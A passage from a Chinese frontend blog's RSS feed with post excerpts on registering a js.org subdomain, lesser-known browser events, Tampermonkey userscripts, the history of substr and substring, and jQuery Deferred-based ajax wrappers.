1. 前提 已经有了github pages的一个博客，并且博客中有内容，没有内容会审核不通过的。我第一次申请域名，就是因为内容太少而审核不通过。 2. 想好自己要什么域名？ 比如你想要一个：wdd.js.org的域名，你先在浏览器里访问这个地址，看看有没有人用过，如果已经有人用过，那么你就只能想点其他的域名了。
3. fork js.org的项目，添加自己的域名 1 fork https://github.com/js-org/dns.js.org 2 修改你fork后的仓库中的cnames_active.js文件，加上自己的一条域名，最好要按照字母顺序
如下图所示，我在第1100行加入。注意，不要在该行后加任何注释。
&amp;#34;wdd&amp;#34;: &amp;#34;wangduanduan.github.io&amp;#34;, 3 commit
4. 加入CNAME文件 我是用hexo和next主题作为博客的模板。其中我在gh-pages分支写博客，然后部署到master分支。
我在我的gh-pages分支的source目录下加入CNAME文件, 内容只有一行
wdd.js.org 将博客再次部署好，如果CNAME生效的话，你已经无法从原来的地址访问：wangduanduan.github.io， 这个博客了。
5. 向js.org项目发起pull-request 找到你fork后的项目，点击 new pull request, 向原来的项目发起请求。
然后你可以在js-org/dns.js.org项目的pull requests看到你的请求，当这个请求被合并时，你就拥有了js.org的二级域名。</description>
    </item>
    
    <item>
      <title>不常用却很有妙用的事件及方法</title>
      <link>https://wdd.js.org/posts/2018/browser-events/</link>
      <pubDate>Mon, 29 Jan 2018 14:15:25 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/browser-events/</guid>
      <description>1. visibilitychange事件 触发条件：浏览器标签页被隐藏或显示的时候会触发visibilitychange事件.
使用场景：当标签页显示或者隐藏时，触发一些业务逻辑
document.addEventListener(&amp;#34;visibilitychange&amp;#34;, function() { console.log( document.visibilityState ); }); 2. storage事件 触发条件：使用localStorage or sessionStorage存储或者修改某个本地存储时
使用场景：标签页间通信
// AB页面同源 // 在A 页面 window.addEventListener(&amp;#39;storage&amp;#39;, (e) =&amp;gt; {console.log(e)}) // 在B 页面，向120打个电话 localStorage.setItem(&amp;#39;makeCall&amp;#39;,&amp;#39;120&amp;#39;) // 然后可以在A页面间有输出, 可以看出A页面 收到了B页面的通知 ...key: &amp;#34;makeCall&amp;#34;, oldValue: &amp;#34;119&amp;#34;, newValue: &amp;#34;120&amp;#34;, ... 3. beforeunload事件 触发条件：当页面的资源将要卸载(及刷新或者关闭标签页前). 当页面依然可见，并且该事件可以被取消只时
使用场景：关闭或者刷新页面时弹窗确认，关闭页面时向后端发送报告等
window.addEventListener(&amp;#34;beforeunload&amp;#34;, function (e) { var confirmationMessage = &amp;#34;\o/&amp;#34;; e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+ return confirmationMessage; // Gecko, WebKit, Chrome &amp;lt;34 }); 4.</description>
    </item>
    
    <item>
      <title>油猴子脚本 - 我的地盘我做主</title>
      <link>https://wdd.js.org/posts/2018/tampermonkey/</link>
      <pubDate>Mon, 29 Jan 2018 13:58:37 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/tampermonkey/</guid>
      <description>当你用浏览器访问某个网页时，你可曾想过，你看到的这个网页，实际上是属于你自己的。
打个比喻：访问某个网站就好像是网购了一筐鸡蛋，鸡蛋虽然是养鸡场生产的，但是这个蛋我怎么吃，你养鸡场管不着。
当然了，对于很多人来说，鸡蛋没有别的吃法，鸡蛋只能煮着吃。
你可以看如下的页面：当你在某搜索引擎上搜索前端开发时
大多数人看到的页面是这样的, 满屏的广告，满屏的推广，满屏的排名，满屏的中间地址跳转，满屏的流量劫持, 还有莆田系
但是有些人的页面却是这样的：清晰，自然，链接直达，清水出芙蓉，天然去雕饰 这就是油猴子脚本干的事情， 当然，它能干的事情，远不止如此。它是齐天大圣孙悟空，有七十二变。
1. 什么是油猴子脚本？ Greasemonkey，简称GM，中文俗称为“油猴”，是Firefox的一个附加组件。它让用户安装一些脚本使大部分HTML为主的网页于用户端直接改变得更方便易用。随着Greasemonkey脚本常驻于浏览器，每次随着目的网页打开而自动做修改，使得运行脚本的用户印象深刻地享受其固定便利性。
Greasemonkey可替网页加入些新功能（例如在亚马逊书店嵌入商品比价功能）、修正网页错误、组合来自不同网页的数据、或者数繁不及备载的其他功能。写的好的Greasemonkey脚本甚至可让其输出与被修改的页面集成得天衣无缝，像是原本网页里的一部分。 来自维基百科
2. 如何安装油猴子插件？ 在google商店搜索Tampermonkey, 安装量最高的就是它。
3. 如何写油猴子脚本？ 油猴子脚本有个新建脚本页面，在此页面可以创建脚本。具体教程可以参考。
中文 GreaseMonkey 用户脚本开发手册 GreaseMonkey（油猴子）脚本开发 深入浅出 Greasemonkey Greasemonkey Hacks/Getting Started 4. 如何使用他人的脚本？ greasyfork网站提供很多脚本，它仿佛是代码界的github, 可以在该网站搜到很多有意思的脚本。
5. 有哪些好用的脚本？ 有哪些超神的油猴脚本?
或者你可以在greasyfork网站查看一些下载量排行</description>
    </item>
    
    <item>
      <title>追本溯源：substr与substring历史漫话</title>
      <link>https://wdd.js.org/posts/2018/substr-and-substring-history/</link>
      <pubDate>Mon, 29 Jan 2018 13:46:31 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/substr-and-substring-history/</guid>
      <description>引子： 很多时候，当我要字符串截取时，我会想到substr和substring的方法，但是具体要怎么传参数时，我总是记不住。哪个应该传个字符串长度，哪个又应该传个开始和结尾的下标，如果我不去查查这两个函数，我始终不敢去使用它们。所以我总是觉得，这个两个方法名起的真是蹩脚。然而事实是这样的吗？
看来是时候扒一扒这两个方法的历史了。
1. 基因追本溯源 在编程语言的历史长河中，曾经出现过很多编程语言。然而大浪淘沙，铅华洗尽之后，很多早已折戟沉沙，有些却依旧光彩夺目。那么stubstr与substring的DNA究竟来自何处？
1950与1960年代
1954 - FORTRAN 1958 - LISP 1959 - COBOL 1964 - BASIC 1970 - Pascal 1967-1978：确立了基础范式
1972 - C语言 1975 - Scheme 1978 - SQL (起先只是一种查询语言，扩充之后也具备了程序结构) 1980年代：增强、模块、性能
1983 - C++ (就像有类别的C) 1988 - Tcl 1990年代：互联网时代
1991 - Python 1991 - Visual Basic 1993 - Ruby 1995 - Java 1995 - Delphi (Object Pascal) 1995 - JavaScript 1995 - PHP 2009 - Go 2014 - Swift (编程语言) 1.</description>
    </item>
    
    <item>
      <title>熟练使用使用jQuery Promise (Deferred)</title>
      <link>https://wdd.js.org/posts/2018/jquery-deferred/</link>
      <pubDate>Mon, 29 Jan 2018 13:43:23 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/jquery-deferred/</guid>
      <description>1. 情景再现 以前用nodejs写后端程序时，遇到Promise这个概念，这个东西好呀！不用谢一层一层回调，直接用类似于jQuery的连缀方式。后来遇到bluebird这个库，它就是Promise库中很有名的。我希望可以把Promise用在前端的ajax请求上，但是我不想又引入bluebird。后来发现，jquery本身就具有类似于Promise的东西。于是我就jquery的Promise写一些异步请求。
2. 不堪回首 看看一看我以前写异步请求的方式
// 函数定义 function sendRequest(req,successCallback,errorCallback){ $.ajax({ ... ... success:function(res){ successCallback(res); }, error:function(res){ errorCallback(res); } }); } // 函数调用,这个函数的匿名函数写的时候很容易出错，而且有时候难以理解 sendRequest(req,function(res){ //请求成功 ... },function(res){ //请求失败 ... }); 3. 面朝大海 下面是我希望的异步调用方式
sendRequest(req) .done(function(res){ //请求成功 ... }) .fail(function(req){ //请求失败 ... }); 4. 废话少说，放‘码’过来 talk is cheap, show me the code
// 最底层的发送异步请求，做成Promise的形式 App.addMethod(&amp;#39;_sendRequest&amp;#39;,function(path,method,payload){ var dfd = $.Deferred(); $.ajax({ url:path, type:method || &amp;#34;get&amp;#34;, headers:{ sessionId:session.id || &amp;#39;&amp;#39; }, data:JSON.stringify(payload), dataType:&amp;#34;json&amp;#34;, contentType : &amp;#39;application/json; charset=UTF-8&amp;#39;, success:function(data){ dfd.</description>
    </item>
    
    
    
  </channel>
</rss>
